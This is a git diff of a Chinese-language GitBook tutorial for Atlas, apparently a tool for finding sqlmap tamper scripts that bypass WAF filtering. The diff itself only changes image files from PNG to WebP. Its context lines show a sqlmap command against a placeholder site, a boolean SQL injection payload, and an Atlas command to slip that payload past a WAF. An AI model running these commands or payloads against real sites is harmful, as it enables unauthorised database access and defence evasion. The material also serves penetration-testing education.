@@ -10,9 +10,9 @@ cd atlas
 python atlas.py # python3+
 ```
 
-![](../../.gitbook/assets/atlas01.png)
+![](../../.gitbook/assets/atlas01.webp)
 
-![](../../.gitbook/assets/atlas02.png)
+![](../../.gitbook/assets/atlas02.webp)
 
 ### 使用
 
@@ -60,7 +60,7 @@ python atlas.py -g
 python sqlmap.py -u 'http://site.com/index.php?id=Price_ASC' --dbs --random-agent -v 3
 ```
 
-![](../../.gitbook/assets/atlas03.png)
+![](../../.gitbook/assets/atlas03.webp)
 
 `Price_ASC') AND 8716=4837 AND ('yajr'='yajr` 被WAF / IDS / IPS阻止，现在尝试使用Atlas：
 
@@ -68,7 +68,7 @@ python sqlmap.py -u 'http://site.com/index.php?id=Price_ASC' --dbs --random-agen
 python atlas.py --url 'http://site.com/index.php?id=Price_ASC' --payload="') AND 8716=4837 AND ('yajr'='yajr" --random-agent -v
 ```
 
-![](../../.gitbook/assets/atlas04.png)
+![](../../.gitbook/assets/atlas04.webp)
 
 在此刻：
 
